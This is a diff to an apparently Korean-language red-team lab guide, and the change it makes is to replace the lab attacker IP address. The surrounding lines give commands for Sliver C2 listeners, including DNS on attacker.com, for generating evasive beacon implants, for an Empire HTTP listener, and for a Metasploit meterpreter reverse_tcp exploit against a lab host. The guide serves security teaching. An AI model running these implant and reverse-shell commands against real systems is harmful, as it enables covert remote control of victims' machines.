@@ -979,7 +979,7 @@ graph LR
 ### 학생 환경 준비
 
 ```bash
-ssh ccc@192.168.0.112
+ssh 6v6-attacker
 
 # 1) Metasploit (이미 설치)
 msfconsole --version
@@ -1014,10 +1014,10 @@ sliver-server
 sudo systemctl start sliver
 
 # === 2. mTLS Listener ===
-sliver > mtls --lhost 192.168.0.112 --lport 443
+sliver > mtls --lhost 10.20.30.202 --lport 443
 
 # === 3. HTTP/S Listener (방화벽 우회) ===
-sliver > https --lhost 192.168.0.112 --lport 443
+sliver > https --lhost 10.20.30.202 --lport 443
 
 # === 4. DNS Listener (가장 은닉) ===
 sliver > dns --domains attacker.com.,c2.attacker.com.
@@ -1025,7 +1025,7 @@ sliver > dns --domains attacker.com.,c2.attacker.com.
 # === 5. Implant 생성 ===
 # Beacon (간헐적 callback — OPSEC 우수)
 sliver > generate beacon \
-    --mtls 192.168.0.112:443 \
+    --mtls 10.20.30.202:443 \
     --os linux \
     --arch amd64 \
     --evasion \
@@ -1033,7 +1033,7 @@ sliver > generate beacon \
 
 # Session (지속 connection)
 sliver > generate \
-    --mtls 192.168.0.112:443 \
+    --mtls 10.20.30.202:443 \
     --os linux \
     --arch amd64 \
     --save /tmp/sliver-session
@@ -1131,7 +1131,7 @@ sudo ./ps-empire client
 # 2) Listener
 (Empire) > listeners
 (Empire) > uselistener http
-(Empire) > set Host http://192.168.0.112:80
+(Empire) > set Host http://10.20.30.202:80
 (Empire) > execute
 
 # 3) Stager 생성 (다양한 형식)
@@ -1154,7 +1154,7 @@ msfconsole -q -x "
 use exploit/...
 set RHOSTS 10.20.30.80
 set PAYLOAD linux/x64/meterpreter/reverse_tcp
-set LHOST 192.168.0.112
+set LHOST 10.20.30.202
 set LPORT 4444
 exploit -j
 "
